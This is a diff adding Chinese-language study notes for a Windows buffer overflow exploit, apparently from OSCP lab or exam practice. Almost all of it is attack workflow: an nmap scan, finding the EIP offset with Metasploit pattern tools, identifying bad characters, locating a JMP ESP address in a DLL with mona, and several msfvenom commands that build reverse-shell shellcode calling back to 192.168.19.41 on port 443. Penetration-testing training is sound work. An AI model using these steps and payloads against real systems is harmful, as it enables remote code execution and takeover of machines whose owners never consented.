@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn 192.168.41.110 > nmap.txt
+
+1.生成3000的pattern
+msf-pattern_create -l 3000
+2.找到EIP 71423471
+3.找出到達EIP的位置 1273
+msf-pattern_offset -l 3000 -q 71423471
+4.調整buffer確定可以控制EIP位置
+5.輸入BadChars找到04,17,4D,5A
+6.查找可用的程序緩存地址 msf-nasm_shell jmp esp
+00000000  FFE4              jmp esp
+7.找到JMP ESP地址  0x1120110d   \x0d\x11\x20\x11
+8.查看可用ddl程序!mona modules
+Log data, item 21
+ Address=0BADF00D
+ Message= 0x56520000 | 0x5657e000 | 0x0005e000 | False  | False   | False |  False   | False  | -1.0- [offsec_pwk_dll.dll] (C:\Users\admin\Desktop\oscp_exam\offsec_pwk_dll.dll)
+9.查看地址
+!mona find -s "\xff\xe4" -m "offsec_pwk_dll.dll"
+10.找到地址 0x56526683
+Log data, item 24
+ Address=56526683
+ Message=  0x56526683 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [offsec_pwk_dll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\oscp_exam\offsec_pwk_dll.dll)
+
+11.生成reverse shell code
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x04\x17\x4d\x5a"
+無法生成
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e cmd/powershell_base64 -b "\x00\x04\x17\x4d\x5a"
+無法生成
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e php/base64 -b "\x00\x04\x17\x4d\x5a"
+可以生成但無法取得reverse
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e cmd/echo -b "\x00\x04\x17\x4d\x5a"
+可以生成但無法取得reverse
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e ruby/base64 -b "\x00\x04\x17\x4d\x5a"
+無法生成
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.41 LPORT=443 -f c -e x86/xor_dynamic -b "\x00\x04\x17\x4d\x5a"
+這個可以
+
+
+10.最後因為decoder的原因,需要shellcode前面加十個\x90
